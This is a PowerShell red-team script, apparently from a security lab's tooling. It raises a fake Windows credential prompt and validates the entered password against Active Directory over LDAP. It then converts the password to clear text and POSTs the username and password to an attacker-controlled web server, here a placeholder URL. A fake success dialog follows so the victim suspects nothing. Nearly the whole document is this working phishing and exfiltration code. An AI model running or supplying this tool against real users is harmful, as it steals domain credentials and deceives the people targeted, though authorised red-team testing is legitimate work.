Add-Type -AssemblyName System.Windows.Forms;
Add-Type -AssemblyName System.Drawing;

<#
Maltek-labs
Website: https://maltek-labs.com
Author: Nicholas Hauer 

Description: 

This script aides in Red Team operations for obtaining credentials used by the user by tricking them into authenticating into a "service". The username and password entered is then sent back to a webserver via POST request. 

In order to send the data, the URL contained below in $URL must be updated with a webserver listening for POST requests for the UserName & Password fields. 

#>

$URL = 'http://example.com/foobar'

function GetCred($URL)
{
	# Credential Setup
	$DomainUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name;
	$credential = Get-Credential -Message "In order to access this resource please enter in your credentials." -UserName $DomainUserName;
	$Password = $credential.GetNetworkCredential().password;
	$CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName;
	
	# Tests Authentication of the supplied credentials against AD to ensure they are valid. 
	$LDAP = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$DomainUserName,$Password);


	if ($LDAP.name -eq $null)
	{
		
		# Authentication failure prompt to be sent for user to provide proper authentication. 
		$AuthFail = New-Object System.Windows.Forms.Form
		$AuthFail.Text = 'Auth Failed'
		$AuthFail.Size = New-Object System.Drawing.Size(300,225)
		$AuthFail.StartPosition = 'CenterScreen'

		$ButtonOK = New-Object System.Windows.Forms.Button
		$ButtonOK.Location = New-Object System.Drawing.Point(75,100)
		$ButtonOK.Size = New-Object System.Drawing.Size(125,50)
		$ButtonOK.Text = 'OK'
		$ButtonOK.DialogResult = [System.Windows.Forms.DialogResult]::OK
		$AuthFail.AcceptButton = $ButtonOK
		$AuthFail.Controls.Add($ButtonOK)

		$Failure = New-Object System.Windows.Forms.Label
		$Failure.Location = New-Object System.Drawing.Point(15,25)
		$Failure.Size = New-Object System.Drawing.Size(280,200)
		$Failure.Text = '	Authentication Failed. 

		Please enter in your credentials.'
		$AuthFail.Controls.Add($Failure)
		$AuthFail.Topmost = $true
		$AuthFail.Add_Shown({$textBox.Select()})
		
		$result = $AuthFail.ShowDialog()

		if ($result -eq [System.Windows.Forms.DialogResult]::OK)
		{
			$x = $textBox.Text
			$x
		}
	}
	else
	{
		# Sends User's username and clear text password to Red Team's controlled web server.
		$ClearPass =[System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($credential.Password));

		$Post = @{UserName=$DomainUserName;Password=$ClearPass};
		Invoke-WebRequest -Uri $URL -Method POST -Body $Post;
		
		# Prompts the user letting them know the Authentication was successful in order to trick them into thinking nothing is wrong. 
		$AuthSuccess = New-Object System.Windows.Forms.Form
		$AuthSuccess.Text = 'Auth Success'
		$AuthSuccess.Size = New-Object System.Drawing.Size(300,225)
		$AuthSuccess.StartPosition = 'CenterScreen'

		$ButtonOK = New-Object System.Windows.Forms.Button
		$ButtonOK.Location = New-Object System.Drawing.Point(75,100)
		$ButtonOK.Size = New-Object System.Drawing.Size(125,50)
		$ButtonOK.Text = 'OK'
		$ButtonOK.DialogResult = [System.Windows.Forms.DialogResult]::OK
		$AuthSuccess.AcceptButton = $ButtonOK
		$AuthSuccess.Controls.Add($ButtonOK)

		$Success = New-Object System.Windows.Forms.Label
		$Success.Location = New-Object System.Drawing.Point(35,35)
		$Success.Size = New-Object System.Drawing.Size(280,200)
		$Success.Text = 'Successfully Authenticated.'
		$AuthSuccess.Controls.Add($Success)
		$AuthSuccess.Topmost = $true
		$AuthSuccess.Add_Shown({$textBox.Select()})
		
		$result = $AuthSuccess.ShowDialog()

		if ($result -eq [System.Windows.Forms.DialogResult]::OK)
		{
			$x = $textBox.Text
			$x
		}
	}
}

GetCred($URL)